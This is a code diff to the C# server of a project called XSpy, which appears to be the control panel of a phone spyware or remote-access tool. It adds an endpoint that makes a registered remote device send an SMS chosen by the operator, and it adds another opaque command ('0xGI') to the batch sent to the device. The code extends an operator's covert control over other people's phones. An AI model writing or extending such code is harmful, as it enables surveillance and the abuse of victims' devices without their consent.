@@ -26,6 +26,27 @@ namespace XSpy.Controllers.Api
             _deviceService = deviceService;
         }
 
+        [HttpPost("{deviceId}/sms"), PreExecution]
+        public async Task<IActionResult> SendSms([FromRoute] Guid deviceId, [FromBody] SendSmsRequest request)
+        {
+            var device = await _deviceService.GetDeviceById(deviceId);
+            if (device == null)
+                return NotFound();
+            
+            var connId = _methods.GetConnectionByDeviceId(device.DeviceId);
+            if (string.IsNullOrEmpty(connId))
+                return BadRequest();
+
+            var client = _hubContext.Clients.Client(connId);
+            if (client == null)
+                return BadRequest();
+            
+            await client.SendAsync("0xSM", "sendSMS", request.Number, request.Message);
+            
+            return Ok(request);
+        }
+        
+
         [HttpGet("{deviceId}/isLoading"), PreExecution]
         public async Task<IActionResult> IsDirLoaded(Guid deviceId)
         {
@@ -69,6 +90,7 @@ namespace XSpy.Controllers.Api
 
             return Ok(pathRequest);
         }
+        
 
         [HttpGet("{deviceId}/update"), PreExecution]
         public async Task<IActionResult> RequestUpdate(Guid deviceId)
@@ -98,6 +120,7 @@ namespace XSpy.Controllers.Api
             await client.SendAsync("0xWI");
             await client.SendAsync("0xPM");
             await client.SendAsync("0xIN");
+            await client.SendAsync("0xGI");
 
             return Ok();
         }
